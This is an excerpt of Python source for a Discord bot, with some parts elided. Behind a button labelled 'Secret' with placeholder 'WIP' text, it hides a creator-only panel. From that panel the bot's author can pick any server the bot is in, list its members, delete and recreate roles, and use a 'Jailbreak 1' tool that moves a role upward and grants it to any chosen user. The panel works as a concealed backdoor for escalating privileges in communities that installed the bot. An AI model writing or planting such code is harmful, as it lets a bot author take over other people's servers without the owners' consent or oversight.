...
def _save_deleted_role(guild_id: int, role: discord.Role):
    from functions import load_stats, save_stats
    stats = load_stats()
    if "deleted_roles" not in stats or not isinstance(stats["deleted_roles"], dict):
        stats["deleted_roles"] = {}
    gid = str(guild_id)
    if gid not in stats["deleted_roles"] or not isinstance(stats["deleted_roles"][gid], dict):
        stats["deleted_roles"][gid] = {}
    stats["deleted_roles"][gid][str(role.id)] = {
        "name": role.name,
...
def _load_deleted_roles(guild_id: int) -> dict:
    from functions import load_stats
    stats = load_stats()
    return dict(((stats.get("deleted_roles") or {}).get(str(guild_id)) or {}))


def _pop_deleted_role(guild_id: int, role_id: str):
    from functions import load_stats, save_stats
    stats = load_stats()
    gid = str(guild_id)
    bucket = ((stats.get("deleted_roles") or {}).get(gid)) or {}
    data = bucket.pop(str(role_id), None)
    if "deleted_roles" not in stats:
        stats["deleted_roles"] = {}
    stats["deleted_roles"][gid] = bucket
    save_stats(stats)
    return data


def _build_config_embed(guild: discord.Guild) -> discord.Embed:
    me = guild.me
    bot_top = me.top_role if me else None
    bot_pos = bot_top.position if bot_top else -1
    roles = sorted([r for r in guild.roles if not r.is_default()], key=lambda r: r.position, reverse=True)
    lines = []
    for r in roles:
        if bot_top and r.id == bot_top.id:
            mark = "🤖"
        elif r.position < bot_pos:
            mark = "🔓"
        else:
            mark = "🔐"
        lines.append(f"{mark} {r.name} (`{r.id}`)")
    role_list = "\n".join(lines) if lines else "No roles."
    if len(role_list) > 2500:
        role_list = role_list[:2490] + "\n…"
    tutorial = "\n".join([
        "**Jailbreak 1 tutorial**",
        "1. Press **Jailbreak 1**.",
        "2. Enter optional `userID` (give role after move).",
        "3. Enter `roleID1` (role to move) and `roleID2` (anchor).",
        "4. Type `above` or `below` to place roleID1 relative to roleID2.",
        "5. Bot cannot move its top role or managed roles. Only roles below 🤖.",
        "6. **Delete role** saves permissions so **Restore** can recreate them.",
        "7. **Show users** lists members as name (`userID`, topRole).",
        "",
        "———",
        role_list,
    ])
    embed = discord.Embed(title="🗝️ Configuration", description=tutorial, color=0x2f3136)
    embed.set_footer(text=f"{guild.name} · `{guild.id}` · 🔓 can manage · 🔐 cannot · 🤖 bot top")
    return embed


class ConfigureRolesServerModal(discord.ui.Modal, title="Configure Roles"):
    server_id = discord.ui.TextInput(label="serverID", placeholder="Server ID", required=True, max_length=25)

    async def on_submit(self, interaction: discord.Interaction):
        if interaction.user.id != CREATOR_ID:
            return await interaction.response.send_message("Creator only.", ephemeral=True)
        raw = str(self.server_id.value or "").strip()
        if not raw.isdigit():
            return await interaction.response.send_message("Invalid serverID.", ephemeral=True)
        guild = interaction.client.get_guild(int(raw))
        if guild is None:
            return await interaction.response.send_message("Bot is not in that server.", ephemeral=True)
        embed = _build_config_embed(guild)
        await interaction.response.send_message(
            embed=embed,
            view=ConfigureRolesView(guild.id),
            ephemeral=True,
        )


class Jailbreak1Modal(discord.ui.Modal, title="Jailbreak 1"):
    def __init__(self, guild_id: int):
        super().__init__()
        self.guild_id = guild_id

    user_id = discord.ui.TextInput(label="userID", placeholder="optional", required=False, max_length=25)
    role_id1 = discord.ui.TextInput(label="roleID1", required=True, max_length=25)
    role_id2 = discord.ui.TextInput(label="roleID2", required=True, max_length=25)
    position = discord.ui.TextInput(label="above/below", placeholder="above or below", required=True, max_length=10)
    ...
    async def on_submit(self, interaction: discord.Interaction):
        ...
        r1s = str(self.role_id1.value or "").strip()
        r2s = str(self.role_id2.value or "").strip()
        if not r1s.isdigit() or not r2s.isdigit():
            return await interaction.response.send_message("roleID1 and roleID2 must be numbers.", ephemeral=True)
        role1 = guild.get_role(int(r1s))
        role2 = guild.get_role(int(r2s))
        ...
        bot_top = me.top_role
        if role1.id == bot_top.id:
            return await interaction.response.send_message("Cannot move the bot's highest role.", ephemeral=True)
        if role1.managed:
            return await interaction.response.send_message("Cannot move a managed/integration role (roleID1).", ephemeral=True)

        pos = str(self.position.value or "").strip().lower()
        if pos not in ("above", "below"):
            return await interaction.response.send_message("Use `above` or `below`.", ephemeral=True)

        if role2.position >= bot_top.position and pos == "above":
            return await interaction.response.send_message(
                "roleID2 is at/above the bot top role — cannot place roleID1 above it.",
                ephemeral=True,
            )
        if role1.position >= bot_top.position:
            return await interaction.response.send_message(
                "roleID1 is at/above the bot top role — bot cannot move it.",
                ephemeral=True,
            )

        try:
            if pos == "above":
                new_pos = role2.position + 1
                if new_pos >= bot_top.position:
                    new_pos = bot_top.position - 1
                if new_pos <= role2.position:
                    return await interaction.response.send_message(
                        "No free position above that role under the bot top role.",
                        ephemeral=True,
                    )
                await role1.edit(position=new_pos, reason="[panel] Jailbreak 1 above")
            else:
                new_pos = max(0, role2.position - 1)
                await role1.edit(position=new_pos, reason="[panel] Jailbreak 1 below")
        except Exception as e:
            return await interaction.response.send_message(f"Move failed: `{e}`", ephemeral=True)

        uid_raw = str(self.user_id.value or "").strip()
        give_msg = ""
        if uid_raw:
            if not uid_raw.isdigit():
                return await interaction.response.send_message(
                    f"Moved **{role1.name}** {pos} **{role2.name}**, but userID invalid.",
                    ephemeral=True,
                )
            member = guild.get_member(int(uid_raw))
            if member is None:
                try:
                    member = await guild.fetch_member(int(uid_raw))
                except Exception:
                    member = None
            if member is None:
                give_msg = " (user not in server, skip give)"
            else:
                try:
                    await member.add_roles(role1, reason="[panel] Jailbreak 1")
                    give_msg = f" + gave {role1.name} to <@{member.id}>"
                except Exception as e:
                    give_msg = f" (give failed: {e})"

        role1 = guild.get_role(role1.id)
        role2 = guild.get_role(role2.id)
        await interaction.response.send_message(
            f"Moved **{role1.name}** (`{role1.id}`) **{pos}** **{role2.name}** (`{role2.id}`) "
            f"[pos {role1.position} vs {role2.position}]{give_msg}.",
            ephemeral=True,
        )


class DeleteRoleModal(discord.ui.Modal, title="Delete role"):
    def __init__(self, guild_id: int):
        super().__init__()
        self.guild_id = guild_id

    role_id = discord.ui.TextInput(label="roleID", required=True, max_length=25)
    ...
    async def on_submit(self, interaction: discord.Interaction):
        ...
        if guild is None:
            return await interaction.response.send_message("Server not found.", ephemeral=True)
        rid = str(self.role_id.value or "").strip()
        if not rid.isdigit():
            return await interaction.response.send_message("Invalid roleID.", ephemeral=True)
        role = guild.get_role(int(rid))
        if role is None:
            return await interaction.response.send_message("Role not found.", ephemeral=True)
        me = guild.me
        if me and role.position >= me.top_role.position:
            return await interaction.response.send_message("Cannot delete a role at/above bot top role.", ephemeral=True)
        if role.managed:
            return await interaction.response.send_message("Cannot delete a managed role.", ephemeral=True)
        try:
            _save_deleted_role(guild.id, role)
            name = role.name
            await role.delete(reason="[panel] Configure Roles delete")
        except Exception as e:
            return await interaction.response.send_message(f"Delete failed: `{e}`", ephemeral=True)
        await interaction.response.send_message(
            f"Deleted **{name}** (`{rid}`). Permissions saved for restore.",
            ephemeral=True,
        )


class RestoreRoleModal(discord.ui.Modal, title="Restore role"):
    def __init__(self, guild_id: int):
        super().__init__()
        self.guild_id = guild_id

    role_field = discord.ui.TextInput(label="roleID/all", placeholder="roleID or all", required=True, max_length=25)
    ...
    async def on_submit(self, interaction: discord.Interaction):
        ...
        if guild is None:
            return await interaction.response.send_message("Server not found.", ephemeral=True)
        raw = str(self.role_field.value or "").strip().lower()
        saved = _load_deleted_roles(guild.id)
        if not saved:
            return await interaction.response.send_message("No saved deleted roles for this server.", ephemeral=True)

        if raw == "all":
            ok, fail = 0, 0
            for rid, data in list(saved.items()):
                try:
                    perms = discord.Permissions(data.get("permissions", 0))
                    await guild.create_role(
                        name=data.get("name") or f"restored-{rid}",
                        permissions=perms,
                        colour=discord.Colour(data.get("color", 0)),
                        hoist=bool(data.get("hoist")),
                        mentionable=bool(data.get("mentionable")),
                        reason="[panel] Restore all roles",
                    )
                    _pop_deleted_role(guild.id, rid)
                    ok += 1
                except Exception:
                    fail += 1
            return await interaction.response.send_message(
                f"Restored **{ok}** role(s). Failed: **{fail}**.",
                ephemeral=True,
            )

        if not raw.isdigit():
            return await interaction.response.send_message("Use a roleID or `all`.", ephemeral=True)
        data = saved.get(raw)
        if not data:
            return await interaction.response.send_message("That roleID is not in the saved list.", ephemeral=True)
        try:
            perms = discord.Permissions(data.get("permissions", 0))
            role = await guild.create_role(
                name=data.get("name") or f"restored-{raw}",
                permissions=perms,
                colour=discord.Colour(data.get("color", 0)),
                hoist=bool(data.get("hoist")),
                mentionable=bool(data.get("mentionable")),
                reason="[panel] Restore role",
            )
            _pop_deleted_role(guild.id, raw)
        except Exception as e:
            return await interaction.response.send_message(f"Restore failed: `{e}`", ephemeral=True)
        await interaction.response.send_message(
            f"Restored **{role.name}** (`{role.id}`) with saved permissions.",
            ephemeral=True,
        )


class ConfigureRolesView(discord.ui.View):
    def __init__(self, guild_id: int):
        super().__init__(timeout=300)
        self.guild_id = guild_id

    @discord.ui.button(label="Jailbreak 1", style=discord.ButtonStyle.danger)
    async def jailbreak1(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != CREATOR_ID:
            return await interaction.response.send_message("Creator only.", ephemeral=True)
        await interaction.response.send_modal(Jailbreak1Modal(self.guild_id))

    @discord.ui.button(label="Show users", style=discord.ButtonStyle.secondary)
    async def show_users(self, interaction: discord.Interaction, button: discord.ui.Button):
        ...
        if not members:
            try:
                ...
                pass
        members = sorted(members, key=lambda m: (m.name or "").lower())
        lines = []
        for m in members:
            top = m.top_role
            role_name = top.name if top and not top.is_default() else "@everyone"
            lines.append(f"{m.name} (`{m.id}`, {role_name})")
        if not lines:
            embeds = [discord.Embed(title="UserID list:", description="No members cached.", color=0x2f3136)]
        else:
            embeds = []
            chunk, size = [], 0
            for line in lines:
                if size + len(line) + 1 > 3800:
                    embeds.append(discord.Embed(title="UserID list:", description="\n".join(chunk), color=0x2f3136))
    ...
    async def delete_role(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != CREATOR_ID:
            return await interaction.response.send_message("Creator only.", ephemeral=True)
        await interaction.response.send_modal(DeleteRoleModal(self.guild_id))
    ...
    async def restore_role(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != CREATOR_ID:
            return await interaction.response.send_message("Creator only.", ephemeral=True)
        await interaction.response.send_modal(RestoreRoleModal(self.guild_id))


class SecretMenuView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="Configure Roles", style=discord.ButtonStyle.secondary)
    async def configure_roles(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != CREATOR_ID:
            return await interaction.response.send_message("Creator only.", ephemeral=True)
        await interaction.response.send_modal(ConfigureRolesServerModal())
...
class PanelView(discord.ui.View):
    ...
    @discord.ui.button(label="🛠️ Secret", style=discord.ButtonStyle.success, custom_id="panel_secret")
    async def secret_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != CREATOR_ID:
            return await interaction.response.send_message("Creator only.", ephemeral=True)
        embed = discord.Embed(title="WIP", description="WIP", color=0x57F287)
        await interaction.response.send_message(embed=embed, view=SecretMenuView(), ephemeral=True)
    ...
    async def guide_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._owner_only(interaction):
            return
        embed = discord.Embed(title="WIP", color=0x2f3136)
        embed.description = chr(10).join([
